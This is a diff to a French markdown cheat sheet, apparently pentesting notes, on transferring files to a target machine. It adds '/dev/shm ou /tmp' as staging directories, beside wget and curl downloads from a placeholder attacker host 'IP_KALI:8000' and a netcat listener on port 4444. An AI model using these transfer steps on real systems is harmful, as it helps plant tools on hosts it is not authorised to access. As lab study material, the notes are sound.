@@ -20,7 +20,7 @@ date: 2025-11-26T16:38:12+01:00
 - Sur **la cible** (recevoir) :
 
   ```bash
-  cd /chemin/du/fichier
+  cd /chemin/du/fichier (/dev/shm ou /tmp)
   wget http://IP_KALI:8000/fichier
   # ou
   curl -O http://IP_KALI:8000/fichier
@@ -58,7 +58,7 @@ date: 2025-11-26T16:38:12+01:00
 - Sur **la cible** (recevoir) :
 
   ```bash
-  cd /chemin/du/fichier
+  cd /chemin/du/fichier (/dev/shm ou /tmp)
   nc -lnvp 4444 > fichier_recu
   ```
 
